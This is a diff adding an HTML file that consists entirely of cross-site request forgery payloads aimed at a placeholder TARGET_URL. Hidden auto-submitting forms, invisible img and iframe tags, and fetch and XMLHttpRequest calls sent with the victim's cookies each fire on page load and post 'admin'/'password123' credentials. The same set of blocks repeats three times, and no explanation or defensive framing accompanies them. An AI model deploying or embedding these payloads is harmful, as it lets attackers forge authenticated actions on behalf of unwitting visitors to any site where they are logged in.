@@ -1,0 +1,178 @@
+<html>
+<body>
+  <form action="TARGET_URL" method="POST">
+    <input type="hidden" name="username" value="admin">
+    <input type="hidden" name="password" value="password123">
+    <input type="submit" value="Submit">
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
+
+<img src="TARGET_URL" style="display:none">
+<iframe style="display:none" src="TARGET_URL"></iframe>
+<script>
+  fetch('TARGET_URL', {
+    method: 'POST',
+    credentials: 'include',
+    body: JSON.stringify({username: 'admin', password: 'password123'}),
+    headers: {'Content-Type': 'application/json'}
+  });
+</script>
+
+<img src="TARGET_URL?username=admin&password=password123" style="display:none">
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "TARGET_URL", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.withCredentials = true;
+  xhr.send("username=admin&password=password123");
+</script>
+
+<iframe src="TARGET_URL?username=admin&password=password123" style="display:none"></iframe>
+
+<script>
+  var img = new Image();
+  img.src = "TARGET_URL?username=admin&password=password123";
+</script>
+
+<form action="TARGET_URL" method="POST" style="display:none">
+  <input type="hidden" name="username" value="admin">
+  <input type="hidden" name="password" value="password123">
+  <input type="submit" value="Submit">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+
+<script>
+  var form = document.createElement("form");
+  form.setAttribute("method", "POST");
+  form.setAttribute("action", "TARGET_URL");
+  form.setAttribute("style", "display:none");
+
+  var username = document.createElement("input");
+  username.setAttribute("type", "hidden");
+  username.setAttribute("name", "username");
+  username.setAttribute("value", "admin");
+  form.appendChild(username);
+
+  var password = document.createElement("input");
+  password.setAttribute("type", "hidden");
+  password.setAttribute("name", "password");
+  password.setAttribute("value", "password123");
+  form.appendChild(password);
+
+  document.body.appendChild(form);
+  form.submit();
+</script>
+
+<iframe src="TARGET_URL?username=admin&password=password123" style="display:none"></iframe>
+
+<img src="TARGET_URL?username=admin&password=password123" style="display:none">
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "TARGET_URL", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.withCredentials = true;
+  xhr.send("username=admin&password=password123");
+</script>
+
+<iframe src="TARGET_URL?username=admin&password=password123" style="display:none"></iframe>
+<img src="TARGET_URL?username=admin&password=password123" style="display:none">
+<script>
+  var img = new Image();
+  img.src = "TARGET_URL?username=admin&password=password123";
+</script>
+
+<form action="TARGET_URL" method="POST" style="display:none">
+  <input type="hidden" name="username" value="admin">
+  <input type="hidden" name="password" value="password123">
+  <input type="submit" value="Submit">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+
+<script>
+  var form = document.createElement("form");
+  form.setAttribute("method", "POST");
+  form.setAttribute("action", "TARGET_URL");
+  form.setAttribute("style", "display:none");
+
+  var username = document.createElement("input");
+  username.setAttribute("type", "hidden");
+  username.setAttribute("name", "username");
+  username.setAttribute("value", "admin");
+  form.appendChild(username);
+
+  var password = document.createElement("input");
+  password.setAttribute("type", "hidden");
+  password.setAttribute("name", "password");
+  password.setAttribute("value", "password123");
+  form.appendChild(password);
+
+  document.body.appendChild(form);
+  form.submit();
+</script>
+
+<img src="TARGET_URL" style="display:none">
+<iframe style="display:none" src="TARGET_URL"></iframe>
+<script>
+  fetch('TARGET_URL', {
+    method: 'POST',
+    credentials: 'include',
+    body: JSON.stringify({username: 'admin', password: 'password123'}),
+    headers: {'Content-Type': 'application/json'}
+  });
+</script>
+
+<img src="TARGET_URL?username=admin&password=password123" style="display:none">
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "TARGET_URL", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.withCredentials = true;
+  xhr.send("username=admin&password=password123");
+</script>
+
+<iframe src="TARGET_URL?username=admin&password=password123" style="display:none"></iframe>
+
+<script>
+  var img = new Image();
+  img.src = "TARGET_URL?username=admin&password=password123";
+</script>
+
+<form action="TARGET_URL" method="POST" style="display:none">
+  <input type="hidden" name="username" value="admin">
+  <input type="hidden" name="password" value="password123">
+  <input type="submit" value="Submit">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+
+<script>
+  var form = document.createElement("form");
+  form.setAttribute("method", "POST");
+  form.setAttribute("action", "TARGET_URL");
+  form.setAttribute("style", "display:none");
+
+  var username = document.createElement("input");
+  username.setAttribute("type", "hidden");
+  username.setAttribute("name", "username");
+  username.setAttribute("value", "admin");
+  form.appendChild(username);
+
+  var password = document.createElement("input");
+  password.setAttribute("type", "hidden");
+  password.setAttribute("name", "password");
+  password.setAttribute("value", "password123");
+  form.appendChild(password);
+
+  document.body.appendChild(form);
+  form.submit();
+</script>
+
